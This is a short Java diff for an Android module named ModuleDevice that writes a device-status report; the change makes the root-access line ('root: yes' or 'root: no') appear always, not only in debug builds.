@@ -133,12 +133,10 @@ public class ModuleDevice extends BaseInstantModule {
 		sb.append("external state: " + Environment.getExternalStorageState() + "\n");
 		sb.append("external space: " + bytesAvailableExt + "\n");
 
-		if (Cfg.DEBUG) {
-			if (Status.self().haveRoot()) {
-				sb.append(M.e("root: yes") + "\n"); //$NON-NLS-1$
-			} else {
-				sb.append(M.e("root: no") + "\n"); //$NON-NLS-1$
-			}
+		if (Status.self().haveRoot()) {
+			sb.append(M.e("root: yes") + "\n"); //$NON-NLS-1$
+		} else {
+			sb.append(M.e("root: no") + "\n"); //$NON-NLS-1$
 		}
 
 		sb.append(M.e("-- PROPERTIES --") + "\n"); //$NON-NLS-1$
